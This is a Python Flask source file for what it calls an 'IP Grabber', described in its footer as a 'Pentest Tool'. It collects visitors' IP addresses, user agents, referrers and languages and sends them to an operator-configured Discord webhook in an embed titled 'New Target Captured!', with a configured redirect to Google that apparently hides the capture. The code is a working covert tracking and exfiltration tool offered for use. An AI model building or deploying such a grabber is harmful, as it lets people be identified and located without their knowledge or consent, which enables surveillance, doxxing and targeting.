from flask import Flask, request, render_template_string
import datetime
import json
import requests
import threading

app = Flask(__name__)

# ⚠️ REPLACE WITH YOUR ACTUAL WEBHOOK URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"
REDIRECT_URL = "https://www.google.com"

def send_to_discord(data):
    """Send captured data to Discord"""
    if not DISCORD_WEBHOOK or "YOUR_WEBHOOK_URL_HERE" in DISCORD_WEBHOOK:
        print("⚠️ Discord webhook not configured")
        return
    
    # Create rich embed
    embed = {
        "title": "🎯 New Target Captured!",
        "color": 0xff4444,
        "fields": [
            {"name": "🌐 IP Address", "value": f"`{data.get('ip', 'Unknown')}`", "inline": True},
            {"name": "⏰ Timestamp", "value": data.get('timestamp', 'Unknown')[:19], "inline": True},
            {"name": "🖥️ User Agent", "value": f"```{data.get('user_agent', 'Unknown')[:100]}```", "inline": False},
            {"name": "🔗 Referrer", "value": data.get('referer', 'Direct Visit'), "inline": True},
            {"name": "🌍 Language", "value": data.get('language', 'Unknown'), "inline": True}
        ],
        "footer": {"text": "IP Grabber • Pentest Tool"},
        "timestamp": datetime.datetime.now().isoformat()
    }
    
    payload = {
        "username": "IP Grabber",
        "avatar_url": "https://cdn-icons-png.flaticon.com/512/1006/1006771.png",
        "embeds": [embed]
    }
    
    def send_async():
        try:
            response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
            if response.status_code == 204:
                print("✅ Discord notification sent")
            else:
                print(f"❌ Discord failed: {response.status_code}")
        except Exception as e:
            print(f"❌ Discord error: {e}")
    
    # Send in background thread to avoid blocking
    threading.Thread(target=send_async, daemon=True).start()
